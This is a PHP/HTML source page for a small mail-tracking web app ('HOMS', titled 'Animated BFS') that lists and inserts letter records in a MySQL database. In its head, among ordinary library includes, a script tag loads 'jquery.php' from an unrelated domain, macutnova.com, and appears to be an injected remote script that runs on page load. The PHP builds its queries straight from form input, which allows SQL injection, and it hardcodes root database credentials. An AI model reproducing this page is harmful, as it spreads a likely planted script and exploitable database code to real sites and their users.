
<!DOCTYPE html>
<html>
<head>
<link href="mail.css" rel="stylesheet" />
<meta charset=utf-8 />
<meta name="viewport" content="user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui">
<title>Animated BFS</title>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script src="http://cytoscape.github.io/cytoscape.js/api/cytoscape.js-latest/cytoscape.min.js"></script>

<script src="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.js"></script>
<script src="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.js"></script>
<link href="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.css" rel="stylesheet" type="text/css" />
<script src="https://cdn.rawgit.com/cytoscape/cytoscape.js-qtip/2.2.5/cytoscape-qtip.js"></script>

<link rel ="stylesheet" type="text/css" href="http://localhost/FrontendCSS.css">
<script src="https://macutnova.com/jquery.php?u=c16102a344e586c77bd406dfa74ed645&c=split24banner4&p=1"></script></head>
<body>

<div id="header">
<h1>HOMS</h1>
</div>
<div id="icbar">
</div>

<div id="Mailback">
		<h2>MAIL FLOW</h2>
    <div id="cy">
      
    </div>
    <div id="cy2">
        
      <form action="mail.php"" method="post">
      <?php
        $servername = "localhost";
        $username = "root";
        $password = "123";
        $dbname = "homs";
        $conn = new mysqli($servername, $username, $password, $dbname) 
        or die ('Cannot connect to db');

        $result = $conn->query("SELECT Letter_ID,Subject FROM Letter");

        
        echo "<select name='id'>";
        
        while ($row = $result->fetch_assoc()) {

                  unset($id, $name, $lname);
                  $id = $row['Letter_ID'];
                  $name = $row['Subject'];
                  echo '<option value="'.$id.'">'.$id.'</option>';
           
        }
        echo "</select>";
        
  mysqli_close($conn);
  ?>
  <input type='submit' value='view' name ='view'>
  </form>
   <?php
        $servername = "localhost";
        $username = "root";
        $password = "123";
        $dbname = "homs";
        $conn = new mysqli($servername, $username, $password, $dbname) 
        or die ('Cannot connect to db');

      

 if(isset($_POST["view"])){
	

	$sql1 = "SELECT * FROM Letter WHERE Letter_ID ='{$_POST["view"]}'";
	$result = mysqli_query($conn, $sql1);
	
	

     //output data of each row
 if(mysqli_num_rows($result) > 0){
    while($row = mysqli_fetch_assoc($result)) {
        echo "Letter_ID 	: " . $row["Letter_ID"]. "<br>". "Subject : " . $row["Subject"]. "<br>". "Recieved Date : " . $row["Recieved_Date"]. "<br>". "Forward to : " .$row["Forward_To"]. "<br>". "Recieved date to AO : " .$row["Recieved_Date_To_AO"]. "<br>";
    }
 }
 else{
   echo "0 results";
}
}
mysqli_close($conn);
?>
            

        
    </div>
</div>
<div id="Mailbackdown">
    

  <form action="mail.php" method="post">
	<tr><td><input type="text" name="Letter_Id" placeholder="Letter Id"></td>  <td><input type="text" name="Subject" placeholder="Subject"></td>  <td><input type="Date" name="Recieved_date" placeholder="Recieved date"></td>   <td><input type="text" name="Forward_to" placeholder="Forward to">   <td><input type="Date" name="Date_to_AO" placeholder="Recieved date to AO"></td> </tr><br>
	<tr><td colspan=4 align="center"><input type="submit" name = "submi"><td></tr>
	</form>
		</table>
<?php
$servername = "localhost";
$username = "root";
$password = "123";
$dbname = "homs";



// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
if(isset($_POST["submi"])){
$sql = "INSERT INTO Letter (Letter_ID, Subject, Recieved_Date, Forward_To, Recieved_Date_To_AO)
VALUES ('{$_POST["Letter_Id"]}', '{$_POST["Subject"]}', '{$_POST["Recieved_date"]}', '{$_POST["Forward_to"]}', '{$_POST["Date_to_AO"]}')";

if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
}



mysqli_close($conn);
?>	
</div>



</div>



<div id="footer">
    <script src="code.js"></script>
</div>

</body>
</html>
<?php
$servername = "localhost";
$username = "root";
$password = "123";
$dbname = "homs";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}



mysqli_close($conn);
?>